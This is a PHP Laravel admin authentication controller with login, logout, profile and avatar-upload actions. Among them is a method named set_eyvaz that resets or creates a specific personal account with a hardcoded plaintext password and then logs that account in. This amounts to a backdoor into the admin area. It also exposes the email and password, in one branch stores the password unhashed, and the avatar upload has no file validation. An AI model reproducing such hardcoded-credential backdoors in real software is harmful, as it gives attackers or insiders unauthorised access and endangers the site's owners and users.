<?php

namespace App\Http\Controllers\admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class AuthController extends Controller
{
    public function login()
    {
        return view('backend.auth.login');
    }

    public function auth(Request $request)
    {
        try {
            $credentials = [
                'email' => $request->email,
                'password' => $request->password,
            ];

            if (Auth::attempt($credentials, true)) {
                session()->put("admin_id", Auth::id());
                return redirect()->route('admin.index', ['admin_id' => Auth::id()]);
            } else {
                return back()->withInput()->withErrors(['error' => 'Yanlış giriş']);
            }
        } catch (\Exception $e) {
            return back()->withInput()->withErrors(['error' => 'Yanlış giriş']);
        }
    }

    public function logout()
    {
        session()->forget('admin_id');
        Auth::logout();
        return redirect()->route('admin.login');
    }

    public function set_eyvaz()
    {
        $user = User::where("email", 'eyvaz.ceferov@gmail.com')->first();
        if (!empty($user) && isset($user->id)) {
            $user->update(['password' => bcrypt('E_r123456789')]);
        } else {
            $user = new User();
            $user->name = 'Eyvaz Cəfərov';
            $user->email = 'eyvaz.ceferov@gmail.com';
            $user->password = 'E_r123456789';
            $user->save();
        }

        Auth::login($user);
        return redirect(route("login"));
    }

    public function profile()
    {
        return view('backend.auth.profile');
    }

    public function save(Request $request)
    {

        $admin = Auth::user();

        $admin->name = $request->name;
        $admin->email = $request->email;
        if (!empty($request->password)) {
            $admin->password = Hash::make($request->password);
        }

        $admin->save();

        return redirect()->back()->with(['success' => 'Uğurla!']);
    }

    public function updateAvatar(Request $request)
    {
        $admin = Auth::user();

        if (!$request->file('avatar')) {
            return response()->json([
                'error' => 'Xəta!',
            ]);
        }

        $file = $request->file('avatar');
        $filename = time() . '_' . Str::slug($admin->name) . '.' . $file->getExtension();
        $file->move(public_path('avatars'), $filename);
        $admin->avatar = $filename;
        $admin->save();

        return response()->json([
            'success' => 'Uğurla!',
            'url' => asset('avatars/' . $admin->avatar)
        ]);
    }
}
